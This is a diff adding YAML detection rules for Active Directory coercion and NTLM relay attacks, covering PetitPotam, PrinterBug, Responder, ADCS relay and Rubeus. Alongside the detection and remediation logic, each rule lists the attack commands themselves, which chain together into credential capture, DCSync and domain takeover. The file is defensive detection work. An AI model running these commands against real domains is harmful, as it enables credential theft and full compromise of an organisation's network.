@@ -1,0 +1,320 @@
+title: AdStrike - Coercion Attacks Detection Rules
+id: sast-coercion-001
+status: production
+description: |
+  SAST detection rules for coercion attack techniques including MS-RPRN
+  (PrinterBug), PetitPotam (EfsRpc), DFSCoerce (MS-DFSNM), ShadowCoerce
+  (MS-FSRVP), Coercer framework, NTLM relay to LDAP/LDAPS/ADCS,
+  Responder NTLMv2 capture, and Unconstrained Delegation TGT capture.
+author: AdStrike SAST Module
+date: 2026-04-24
+mitre_attack:
+  - T1187    # Forced Authentication
+  - T1557    # Adversary-in-the-Middle
+  - T1557.001  # LLMNR/NBT-NS Poisoning
+  - T1649    # Steal or Forge Authentication Certificates
+
+rules:
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: MS-RPRN PrinterBug  (T1187)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: coerce-printerbug-001
+    title: MS-RPRN PrinterBug — Force DC Authentication via Print Spooler
+    technique: T1187
+    severity: critical
+    description: >
+      MS-RPRN's RpcRemoteFindFirstPrinterChangeNotification API forces target to
+      authenticate to attacker-controlled host. Used to capture NTLMv2 hash or
+      relay to LDAP/ADCS. Requires Print Spooler running on target DC.
+    event_sources:
+      - windows_security_eventlog:
+          event_ids: [4624]
+          conditions:
+            - field: LogonType
+              value: "3"
+            - field: TargetUserName
+              endswith: "$"  # Computer account authenticating
+    network_indicators:
+      - protocol: SMB
+        destination_port: 445
+        description: "DC authenticating outbound to non-DC SMB server"
+      - protocol: RPC
+        destination_port: 135
+    sysmon_detection:
+      - event_id: 3  # Network Connection
+        image: "spoolsv.exe"
+        destination_not_in: dc_list
+    detection:
+      sigma_condition: |
+        EventID=3 AND Image ENDSWITH "\\spoolsv.exe" AND
+        DestinationIp NOT IN dc_ip_list AND
+        DestinationPort=445
+    tools_used:
+      - "python3 printerbug.py '{dom}/{user}:{pass}@{dc}' {attacker}"
+      - ".\\MS-RPRN.exe \\\\{dc} \\\\{attacker}"
+      - "crackmapexec smb {dc} -u {user} -p {pass} -M spooler  # Check if vulnerable"
+    false_positives:
+      - Legitimate printer sharing and management
+      - Print Spooler connections to authorized print servers
+    remediation:
+      - Disable Print Spooler service on all Domain Controllers (not needed)
+      - Block SMB outbound from DCs to non-DC hosts (firewall rule)
+      - Apply PrintNightmare patches and disable outbound SMB from DCs
+      - Monitor spoolsv.exe network connections
+    references:
+      - https://attack.mitre.org/techniques/T1187/
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: PetitPotam — EfsRpc Coercion  (T1187)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: coerce-petitpotam-001
+    title: PetitPotam — EfsRpc Forced Authentication (Authenticated and Unauthenticated)
+    technique: T1187
+    severity: critical
+    description: >
+      PetitPotam exploits MS-EFSRPC (EfsRpcOpenFileRaw) to force target to
+      authenticate to attacker. Can work unauthenticated on older Windows versions.
+      Used for NTLM relay to LDAP or ADCS to compromise domain.
+    network_indicators:
+      - protocol: RPC
+        uuid: "c681d488-d850-11d0-8c52-00c04fd90f7e"  # MS-EFSRPC
+        method: "EfsRpcOpenFileRaw"
+    event_sources:
+      - windows_security_eventlog:
+          event_ids: [4624]
+    sysmon_detection:
+      - event_id: 3
+        image: "lsass.exe"
+        destination_not_in: dc_list
+        destination_port: 445
+    detection:
+      sigma_condition: |
+        EventID=3 AND Image ENDSWITH "\\lsass.exe" AND
+        DestinationIp NOT IN dc_ip_list AND
+        DestinationPort IN [445, 135]
+      network_signature:
+        - RPC call to IEfsRpc interface from external host
+        - EfsRpcOpenFileRaw with UNC path pointing to attacker
+    tools_used:
+      - "python3 PetitPotam.py -u '{user}' -p '{pass}' -d '{dom}' {attacker} {dc}"
+      - "python3 PetitPotam.py {attacker} {dc}  # Unauthenticated (older systems)"
+    remediation:
+      - Apply MS KB5005413 (PetitPotam patches)
+      - Block LSASS outbound SMB connections via firewall
+      - Disable EFS if not required
+      - Enable EPA on LDAP (LDAP signing + channel binding)
+      - Monitor lsass.exe network connections
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: DFSCoerce — MS-DFSNM  (T1187)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: coerce-dfscoerce-001
+    title: DFSCoerce — NetrDfsAddStdRoot MS-DFSNM Forced Authentication
+    technique: T1187
+    severity: high
+    description: >
+      DFSCoerce exploits MS-DFSNM NetrDfsAddStdRoot/NetrDfsRemoveStdRoot to force
+      authentication. Authenticated vector. Works even when PetitPotam is patched.
+    network_indicators:
+      - rpc_interface: "4fc742e0-4a10-11cf-8273-00aa004ae673"  # MS-DFSNM
+    tools_used:
+      - "python3 dfscoerce.py -u '{user}' -p '{pass}' -d '{dom}' {attacker} {dc}"
+    remediation:
+      - Disable DFS-N service on DCs if not required
+      - Block outbound SMB from DCs via Windows Firewall
+      - Monitor DFS RPC interface calls from external hosts
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: Coercer — Multi-Method Coercion Framework  (T1187)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: coerce-coercer-001
+    title: Coercer Framework — Automated Multi-Protocol Coercion Scan and Exploit
+    technique: T1187
+    severity: critical
+    description: >
+      Coercer automatically tries all known coercion methods (MS-RPRN, MS-EFSRPC,
+      MS-DFSNM, MS-FSRVP, MS-TSCH, etc.) against target. -scan mode passive detection,
+      no authentication attempt. High-value target: DCs.
+    tools_used:
+      - "coercer scan -u '{user}' -p '{pass}' -d '{dom}' -t {dc}  # Passive check"
+      - "coercer coerce -u '{user}' -p '{pass}' -d '{dom}' -l {attacker} -t {dc}"
+    detection:
+      sigma_condition: |
+        Multiple RPC interface calls to different services from same source IP in short window:
+        (NetrRpcNotify + EfsRpcOpenFileRaw + NetrDfsAddStdRoot) from same host within 60s
+    remediation:
+      - Block all coercible RPC interfaces at network perimeter
+      - Disable unnecessary services (Spooler, EFS, DFS-N) on DCs
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: Responder — LLMNR/NBT-NS Poisoning + NTLMv2 Capture  (T1557.001)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: coerce-responder-001
+    title: Responder — LLMNR/NBT-NS Poisoning for NTLMv2 Hash Capture
+    technique: T1557.001
+    severity: high
+    description: >
+      Responder poisons LLMNR and NBT-NS name resolution to redirect victims to
+      attacker's SMB/HTTP server for NTLMv2 hash capture. Combined with coercion
+      for targeted hash collection.
+    network_indicators:
+      - protocol: LLMNR
+        port: 5355
+        response_from_unexpected_host: true
+      - protocol: NBT-NS
+        port: 137
+        response_from_unexpected_host: true
+    detection:
+      sigma_condition: |
+        (NetworkProtocol=LLMNR AND SourceIp NOT IN DC_list AND ResponseToQuery=true) OR
+        (NetworkProtocol=NBT-NS AND SourceIp NOT IN DC_list AND ResponseType=NameConflict)
+    tools_used:
+      - "sudo responder -I eth0 -rdw  # Start poisoner"
+      - "Combined with coercion to capture DC$ NTLMv2 hash"
+    remediation:
+      - Disable LLMNR via Group Policy: Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution
+      - Disable NetBIOS over TCP/IP (disable NBT-NS)
+      - Monitor for unexpected LLMNR/NBT-NS responses on network
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: NTLM Relay to LDAP/LDAPS  (T1557)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: coerce-ntlm-relay-ldap-001
+    title: NTLM Relay to LDAP — Computer Account / DCSync Rights
+    technique: T1557
+    severity: critical
+    description: >
+      NTLM relay to LDAP/LDAPS allows attacker to authenticate as victim
+      (typically DC$) and perform LDAP operations: add computer accounts,
+      grant DCSync rights, set RBCD, or modify group membership.
+      impacket-ntlmrelayx --delegate-access enables RBCD relay.
+    event_sources:
+      - windows_security_eventlog:
+          event_ids: [4741, 5136, 4662]
+    detection:
+      sigma_condition: |
+        (EventID=4741 AND SubjectUserName ENDSWITH "$" AND SubjectDomainName IN [dom])
+        OR (EventID=5136 AND SubjectUserName ENDSWITH "$" AND
+            AttributeLDAPDisplayName IN ["msDS-AllowedToActOnBehalfOfOtherIdentity",
+                                          "nTSecurityDescriptor"])
+      behavioral_indicators:
+        - Computer account ($) creating other computer accounts
+        - DC$ modifying LDAP attributes immediately after coercion
+        - DCSync ACE added by computer account
+    tools_used:
+      - "impacket-ntlmrelayx -t ldap://{dc} -smb2support --add-computer {comp} {comp_pass}"
+      - "impacket-ntlmrelayx -t ldaps://{dc} -smb2support --escalate-user {user}"
+      - "impacket-ntlmrelayx -t ldap://{dc} -smb2support --delegate-access  # RBCD"
+    remediation:
+      - Enable LDAP signing (require signing for LDAP clients)
+      - Enable LDAP channel binding (CVE-2017-8563 mitigations)
+      - Enforce SMB signing (prevents relay from SMB sources)
+      - Block cross-protocol relay with EPA
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: NTLM Relay to ADCS — DC Certificate → Domain Admin  (T1649 + T1557)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: coerce-ntlm-relay-adcs-001
+    title: NTLM Relay to ADCS — DC Certificate Enrollment for DA Takeover
+    technique: T1649
+    severity: critical
+    description: >
+      Most impactful relay attack: coerce DC$ authentication, relay to ADCS
+      web enrollment, obtain DC certificate, use PKINIT to get DC TGT,
+      then DCSync all hashes. Full domain compromise in minutes.
+      Attack chain: PetitPotam → ntlmrelayx --adcs → certipy auth → secretsdump
+    event_sources:
+      - certsvc_eventlog:
+          event_ids: [4886, 4887]
+      - iis_access_logs:
+          indicators: ["POST /certsrv/certfnsh.asp"]
+    detection:
+      sigma_condition: |
+        EventID=4887 AND
+        Template IN ["DomainController", "DomainControllerAuthentication"] AND
+        (RequestorName ENDSWITH "$" AND RequestorMachine NOT IN dc_list)
+    tools_used:
+      - "impacket-ntlmrelayx -t http://{dc}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+      - "certipy relay -ca {dc} -template DomainController"
+      - "certipy auth -pfx dc.pfx -dc-ip {dc} -domain {dom}  # Get DC TGT"
+      - "impacket-secretsdump {dom}/dc$@{dc} -k -no-pass  # DCSync"
+    remediation:
+      - Enable HTTPS + EPA on ADCS Web Enrollment (prevents relay)
+      - Require Kerberos for ADCS enrollment
+      - Monitor ADCS Event 4887 for cross-machine DC cert issuance
+      - Apply MS KB5005413 + enable EPA on IIS ADCS
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: NTLM Relay with Shadow Credentials  (T1556.006)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: coerce-shadow-cred-relay-001
+    title: NTLM Relay with Shadow Credentials — msDS-KeyCredentialLink via Relay
+    technique: T1556.006
+    severity: critical
+    description: >
+      ntlmrelayx --shadow-credentials injects attacker certificate into
+      msDS-KeyCredentialLink of target account (usually DC$) during relay.
+      Enables PKINIT authentication as DC$ → DCSync.
+    tools_used:
+      - "impacket-ntlmrelayx -t ldap://{dc} --shadow-credentials --shadow-target {target}$"
+    detection:
+      sigma_condition: |
+        EventID=5136 AND
+        AttributeLDAPDisplayName="msDS-KeyCredentialLink" AND
+        SubjectUserName ENDSWITH "$" AND  # Computer account modifying attribute
+        SubjectUserName != ObjectName     # Modifying different object
+    remediation:
+      - Enable LDAP signing + channel binding
+      - Monitor msDS-KeyCredentialLink modifications (Event 5136)
+      - Alert on computer accounts modifying other computer accounts' attributes
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: Unconstrained Delegation TGT Capture  (T1134.001)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: coerce-unconstrained-tgt-001
+    title: Unconstrained Delegation TGT Capture via Coercion
+    technique: T1134.001
+    severity: critical
+    description: >
+      Rubeus monitor on unconstrained delegation host captures forwarded TGT
+      when coercion forces DC to authenticate. Captured TGT used for
+      Pass-the-Ticket → DCSync or domain compromise.
+    detection:
+      sigma_condition: |
+        (EventID=10 AND Image ENDSWITH "\\Rubeus.exe" AND CommandLine CONTAINS "monitor") OR
+        (EventID=4768 AND TicketOptions CONTAINS "forwardable" AND
+         ClientAddress NOT IN dc_ip_list AND TargetUserName ENDSWITH "$")
+    tools_used:
+      - "Rubeus.exe monitor /interval:5 /filteruser:DC$  # On unconstrained host"
+      - "Rubeus.exe ptt /ticket:{base64}  # After capture"
+      - "Rubeus.exe s4u /ticket:{base64} /impersonateuser:Administrator /msdsspn:cifs/{dc} /ptt"
+    remediation:
+      - Remove Unconstrained Delegation from non-DC computers
+      - Enable Protected Users group for privileged service accounts
+      - Monitor Rubeus.exe execution
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SAST CODE ANALYSIS
+# ─────────────────────────────────────────────────────────────────────────────
+sast_code_analysis:
+  file: modules/coercion_attacks.py
+  rules:
+    - id: sast-code-coerce-001
+      title: Attacker IP Required but Potentially Unvalidated
+      severity: medium
+      pattern: |
+        attacker\s+=\s+prompt\("Attacker listener IP"\)
+      description: >
+        Attacker IP not validated as valid IPv4/IPv6 before use in commands.
+        Invalid IP address in relay commands would cause silent failure.
+      recommendation: "Validate IP format with socket.inet_aton() or ipaddress.ip_address()"
+
+    - id: sast-code-coerce-002
+      title: Responder Must Be Started Manually — Race Condition Risk
+      severity: info
+      pattern: |
+        info\("Start Responder first.*"\)
+      description: >
+        Tool correctly informs operator to start Responder before relay.
+        However, no verification that Responder is actually running is done.
+        NTLM relay will fail silently if Responder not started first.
